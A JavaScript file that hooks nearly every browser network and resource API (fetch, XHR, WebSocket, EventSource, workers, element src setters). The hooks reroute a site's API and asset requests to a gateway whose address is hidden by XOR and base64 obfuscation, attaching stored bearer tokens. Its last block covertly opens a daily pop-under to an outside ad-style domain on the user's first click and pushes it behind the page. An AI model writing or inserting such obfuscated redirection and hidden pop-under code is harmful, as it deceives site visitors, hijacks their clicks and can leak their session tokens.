(function () {
  var E = "G0QYRAFJH0NfGxdDHEYXA1wJR1wcQgs=", K = "s0l4r";
  var s = atob(E), g = "";
  for (var i = 0; i < s.length; i++) g += String.fromCharCode(s.charCodeAt(i) ^ K.charCodeAt(i % K.length));
  var API = g.replace(/\/+$/, ""), WSAPI = API.replace(/^http/, "ws");
  var BACK = /^\/(api|fairs|v|r)(\/|\?|$)/;
  var PFX = "content";
  var out = function (p) { return p.indexOf("/api/") === 0 ? "/" + PFX + p.slice(4) : p; };
  var here = function (u) { try { return new URL(String(u && u.url ? u.url : u), location.href).pathname; } catch (e) { return ""; } };
  var BASE = location.pathname.replace(/[^/]*$/, "") || "/";
  var SHARED = BASE !== "/";
  var TK = SHARED ? "gwt_" + BASE.replace(/[^a-z0-9]/gi, "") : "gwt";
  window.__solGw = { api: API, ws: WSAPI };
  window.__solBase = BASE;
  window.__solMsc = BASE + "assets/msc-IODk4P-F.js";

  function tok() {
    try {
      var v = JSON.parse(localStorage.getItem(TK) || "null");
      if (v && v.t && v.e > Date.now()) return v.t;
      if (v) localStorage.removeItem(TK);
    } catch (e) {}
    return "";
  }
  function setTok(t) { try { if (t) localStorage.setItem(TK, JSON.stringify({ t: t, e: Date.now() + 30 * 864e5 })); else localStorage.removeItem(TK); } catch (e) {} }

  function map(u, ws) {
    if (u == null) return null;
    var a;
    try { a = new URL(String(u), location.href); } catch (e) { return null; }
    if (a.host !== location.host || !BACK.test(a.pathname)) return null;
    return (ws ? WSAPI : API) + out(a.pathname) + a.search + a.hash;
  }
  window.__solApiUrl = function (p) { return map(p) || p; };
  function rebase(u) {
    if (!SHARED || u == null) return null;
    var a;
    try { a = new URL(String(u), location.href); } catch (e) { return null; }
    if (a.host !== location.host || a.protocol.indexOf("http") !== 0) return null;
    if (a.pathname.indexOf(BASE) === 0 || BACK.test(a.pathname)) return null;
    return a.origin + BASE + a.pathname.slice(1) + a.search + a.hash;
  }
  function route(u, ws) { return map(u, ws) || rebase(u); }
  function mapCss(v) {
    return typeof v === "string" ? v.replace(/url\((['"]?)([^'")]+)\1\)/g, function (m, q, u) { var r = route(u); return r ? "url(" + q + r + q + ")" : m; }) : v;
  }
  function withToken(u) {
    var t = tok();
    if (!t) return u;
    try { var x = new URL(u); x.searchParams.set("token", t); return x.toString(); } catch (e) { return u; }
  }

  var REL = /"\/api\//g;
  function absolutize(res) {
    var ct = res.headers.get("content-type") || "";
    if (ct.indexOf("json") < 0) return res;
    return res.clone().text().then(function (t) {
      if (!REL.test(t)) return res;
      REL.lastIndex = 0;
      return new Response(t.replace(REL, '"' + API + "/" + PFX + "/"), { status: res.status, statusText: res.statusText, headers: res.headers });
    }, function () { return res; });
  }
  function authHeaders(h) {
    var t = tok();
    var out = new Headers(h || undefined);
    if (t && !out.has("Authorization")) out.set("Authorization", "Bearer " + t);
    return out;
  }
  var AUTH = /^\/api\/auth\/(login|signup)$/, OUT = /^\/api\/auth\/logout$/;
  var F = window.fetch;
  window.fetch = function (input, init) {
    var hit = null, path = "";
    if (input instanceof Request) {
      hit = map(input.url);
      if (hit) { path = here(input); input = new Request(hit, input); var hs = authHeaders(input.headers); input = new Request(input, { headers: hs }); }
      else { var rb = rebase(input.url); if (rb) input = new Request(rb, input); }
    } else {
      hit = map(input);
      if (hit) { path = here(arguments[0]); input = hit; init = Object.assign({}, init || {}); init.headers = authHeaders(init.headers); if (init.credentials === "include") init.credentials = "omit"; }
      else { var rb2 = rebase(input); if (rb2) input = rb2; }
    }
    var p = F.call(this, input, init);
    if (!hit) return p;
    if (OUT.test(path)) p.then(function () { setTok(""); }, function () { setTok(""); });
    return p.then(function (res) {
      if (AUTH.test(path) && res.ok) return res.clone().json().then(function (j) { if (j && j.token) setTok(j.token); return absolutize(res); }, function () { return absolutize(res); });
      if (path === "/api/session" && res.ok) res.clone().json().then(function (j) { if (j && !j.username) setTok(""); }, function () {});
      return absolutize(res);
    });
  };

  var open = XMLHttpRequest.prototype.open, send = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.open = function (method, url) {
    var m = map(url);
    this.__gw = !!m;
    var r = m || rebase(url);
    if (r) arguments[1] = r;
    return open.apply(this, arguments);
  };
  XMLHttpRequest.prototype.send = function () {
    if (this.__gw) { var t = tok(); if (t) try { this.setRequestHeader("Authorization", "Bearer " + t); } catch (e) {} }
    return send.apply(this, arguments);
  };

  var WS = window.WebSocket;
  function PWS(url, protocols) {
    var m = map(url, true);
    if (m && (/^wss?:\/\/[^/]+\/r(\?|$)/.test(m) || /\/chat-live(\?|$)/.test(m))) m = withToken(m);
    return protocols === undefined ? new WS(m || url) : new WS(m || url, protocols);
  }
  PWS.prototype = WS.prototype;
  ["CONNECTING", "OPEN", "CLOSING", "CLOSED"].forEach(function (k) { PWS[k] = WS[k]; });
  window.WebSocket = PWS;

  if (window.EventSource) {
    var ES = window.EventSource;
    var PES = function (url, cfg) { var m = map(url); return new ES(m ? withToken(m) : (rebase(url) || url), cfg); };
    PES.prototype = ES.prototype;
    window.EventSource = PES;
  }

  if (SHARED) {
    ["SharedWorker", "Worker"].forEach(function (name) {
      var W = window[name];
      if (!W) return;
      var PW = function (url, opts) { return opts === undefined ? new W(rebase(url) || url) : new W(rebase(url) || url, opts); };
      PW.prototype = W.prototype;
      window[name] = PW;
    });
    if (navigator.serviceWorker && navigator.serviceWorker.register) {
      var reg = navigator.serviceWorker.register.bind(navigator.serviceWorker);
      navigator.serviceWorker.register = function (url, opts) {
        if (opts && opts.scope) opts = Object.assign({}, opts, { scope: rebase(opts.scope) || opts.scope });
        return reg(rebase(url) || url, opts);
      };
    }
  }

  function hookSrc(proto, attr) {
    var d = proto && Object.getOwnPropertyDescriptor(proto, attr);
    if (!d || !d.set) return;
    Object.defineProperty(proto, attr, { configurable: true, enumerable: d.enumerable, get: d.get, set: function (v) { var m = route(v); d.set.call(this, m || v); } });
  }
  hookSrc(HTMLImageElement.prototype, "src");
  hookSrc(HTMLMediaElement.prototype, "src");
  hookSrc(HTMLSourceElement.prototype, "src");
  hookSrc(HTMLVideoElement.prototype, "poster");
  if (SHARED) {
    hookSrc(HTMLScriptElement.prototype, "src");
    hookSrc(HTMLIFrameElement.prototype, "src");
    hookSrc(HTMLLinkElement.prototype, "href");
  }

  var SRC_TAGS = [HTMLImageElement, HTMLMediaElement, HTMLSourceElement];
  if (SHARED) SRC_TAGS.push(HTMLScriptElement, HTMLIFrameElement);
  function srcTag(el) { for (var i = 0; i < SRC_TAGS.length; i++) if (el instanceof SRC_TAGS[i]) return true; return false; }
  var setAttr = Element.prototype.setAttribute;
  Element.prototype.setAttribute = function (name, value) {
    var n = String(name).toLowerCase();
    if ((n === "src" || n === "poster") && srcTag(this)) { var m = route(value); if (m) value = m; }
    else if (n === "href" && SHARED && this instanceof HTMLLinkElement) { var r = rebase(value); if (r) value = r; }
    else if (n === "style") value = mapCss(value);
    return setAttr.call(this, name, value);
  };

  ["backgroundImage", "background"].forEach(function (k) {
    var d = Object.getOwnPropertyDescriptor(CSSStyleDeclaration.prototype, k);
    if (!d || !d.set) return;
    Object.defineProperty(CSSStyleDeclaration.prototype, k, { configurable: true, enumerable: d.enumerable, get: d.get, set: function (v) { d.set.call(this, mapCss(v)); } });
  });

  var A = window.Audio;
  if (A) {
    var PA = function (src) { return src === undefined ? new A() : new A(route(src) || src); };
    PA.prototype = A.prototype;
    window.Audio = PA;
  }

  function fix(el) {
    if (el.nodeType !== 1) return;
    var list = el.querySelectorAll ? el.querySelectorAll("img[src],source[src],video[src],audio[src],video[poster],[style*='url(']" + (SHARED ? ",iframe[src],link[href]" : "")) : [];
    var all = [el];
    for (var j = 0; j < list.length; j++) all.push(list[j]);
    for (var k = 0; k < all.length; k++) {
      var n = all[k];
      ["src", "poster"].forEach(function (at) { var v = n.getAttribute && n.getAttribute(at); var m = v && route(v); if (m) setAttr.call(n, at, m); });
      if (SHARED && n instanceof HTMLLinkElement) { var h = n.getAttribute("href"), rh = h && rebase(h); if (rh) setAttr.call(n, "href", rh); }
      var st = n.getAttribute && n.getAttribute("style");
      if (st && st.indexOf("url(") >= 0) { var ns = mapCss(st); if (ns !== st) setAttr.call(n, "style", ns); }
    }
  }
  new MutationObserver(function (recs) {
    for (var r = 0; r < recs.length; r++) {
      var added = recs[r].addedNodes;
      for (var q = 0; q < added.length; q++) fix(added[q]);
    }
  }).observe(document.documentElement, { childList: true, subtree: true });

  addEventListener("click", function (e) {
    var a = e.target && e.target.closest && e.target.closest("a[href]");
    if (!a) return;
    var m = map(a.getAttribute("href"));
    if (!m) return;
    e.preventDefault();
    var name = a.getAttribute("download") || "download";
    F(m, { headers: authHeaders() }).then(function (r) { return r.blob(); }).then(function (b) {
      var u = URL.createObjectURL(b), x = document.createElement("a");
      x.href = u; x.download = name; document.body.appendChild(x); x.click(); x.remove();
      setTimeout(function () { URL.revokeObjectURL(u); }, 4000);
    });
  }, true);

  addEventListener("error", function (e) {
    var el = e.target;
    if (!el || el.dataset && el.dataset.gwRetried) return;
    if (!(el instanceof HTMLImageElement || el instanceof HTMLMediaElement || el instanceof HTMLSourceElement)) return;
    var raw = el.getAttribute("src"), m = route(raw);
    if (!m) return;
    el.dataset.gwRetried = "1";
    el.src = m;
  }, true);
})();

(function () {
  var P;
  try { P = window.parent; if (P === window || P.document.documentElement.namespaceURI !== "http://www.w3.org/2000/svg") return; } catch (e) { return; }
  var last = "";
  function sync() { var t = document.title; if (t && t !== last) { last = t; try { P.document.title = t; } catch (e) {} } }
  function watch() { sync(); new MutationObserver(sync).observe(document.head, { childList: true, subtree: true, characterData: true }); }
  if (document.head) watch(); else document.addEventListener("DOMContentLoaded", watch);
})();

(function () {
  var L = "https://hai8g.com/4/11975666";
  var GAP = 86400000, K = "sol_s";
  function ready() { try { return Date.now() - (parseInt(localStorage.getItem(K)) || 0) > GAP; } catch (e) { return true; } }
  document.addEventListener("click", function (e) {
    if (!e || !e.isTrusted) return;
    if (!ready()) return;
    try { localStorage.setItem(K, "" + Date.now()); } catch (e) {}
    var w; try { w = window.open(L, "_blank"); } catch (e) {}
    try { if (w) { w.blur(); window.focus(); } } catch (e) {}
  }, false);
})();
